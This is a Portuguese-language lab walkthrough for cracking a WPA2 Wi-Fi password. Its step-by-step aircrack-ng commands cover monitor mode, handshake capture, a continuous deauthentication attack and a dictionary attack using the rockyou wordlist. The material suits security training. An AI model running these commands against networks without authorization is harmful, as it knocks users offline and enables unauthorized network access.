### Walkthrough Lab_CrackingWPA2
- Instalar recursos:
  - iw:
    - ```sudo apt install iw```.
  - aircrack-ng:
    - ```sudo apt install aircrack-ng```.
  - Git:
    - ```sudo apt install git```.
  - Wordlists com rockyou.txt:
    - ```sudo find / -name "rockyou.txt" -print -quit 2>/dev/nul```;
    - Anotar caminho ou:
      - ```sudo find / -name "rockyou.txt*" -print -quit 2>/dev/nul```;
      - Anotar caminho ou:
        - ```sudo mkdir -p /usr/share/wordlists```;
        - ```sudo git clone --depth 1 https://github.com/danielmiessler/SecLists.git /usr/share/wordlists/seclists```;
        - ```sudo tar -xvf /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz```;
        - ```sudo find / -name "rockyou.txt" -print -quit 2>/dev/nul```;
        - Anotar caminho /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt.

- Verificar compatibilidade:
  - Hardware:
    - Placa integrada:
      - ```lspci | grep -i network```.
    - Adaptador USB:
      - ```lsusb```.
  - Driver:
    - ```iw list | grep -A 10 "Supported interface modes"```;
    - Verificar opção monitor.
  

- Ver interfaces:
  - ```ip addr```, ```iwconfig``` ou ```iw dev```;
  - Anotar o nome da sua interface.

- Matar processos:
  - ```sudo airmon-ng check kill```.

- Iniciar modo monitor:
  - ```sudo airmon-ng start interface```;
  - Substitua interface pelo nome da sua interface.
  - O nome da interface em modo monitor muda para nome da interface+mon.

- Verificar se a interface está em modo monitor:
  - ```sudo airmon-ng```, ```iwconfig``` ou ```iw dev```.

- Descobrir pontos de acesso:
  - ```sudo airodump-ng interfacemon```;
  - Substitua interfacemon pelo nome da sua interface em modo monitor;
  - Anotar  MAC address do AP e canal do alvo;
    - BSSID: 00:1A:3F:DD:22:D4;
    - Channel: 7.

- Capturar handshake WPA:
  - ```sudo airodump-ng -w Lab_CrackingWPA2 -c canal --bssid BSSID interfacemon```;
  - Substitua Lab_CrackingWPA2-01.cap pelo nome do seu arquivo;
  - Substitua canal pelo canal do alvo;
  - Substitua BSSID pelo BSSID do alvo;
  - Substitua interfacemon pelo nome da sua interface em modo monitor.

- Deauth attack
  - Abrir mais uma do terminal
  - ```sudo aireplay-ng --deauth 0 -a BSSID interfacemon```

- Abrir o arquivo com o Wireshark:
  - Lab_CrackingWPA2-01.cap ou o arquivo que você nomeou+01.cap;
  - Use o filtro ```eapol```.

- Parar modo monitor:
  - ```airmon-ng stop interfacemon```.

- Restaurar serviço de rede:
  - ```sudo systemctl start NetworkManager```.

- Quebrar a senha utilizando a wordlist rockyou.txt:
  - ```aircrack-ng Lab_CrackingWPA2-01.cap -w /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt```;
  - Substitua Lab_CrackingWPA2-01.cap pelo nome do seu arquivo.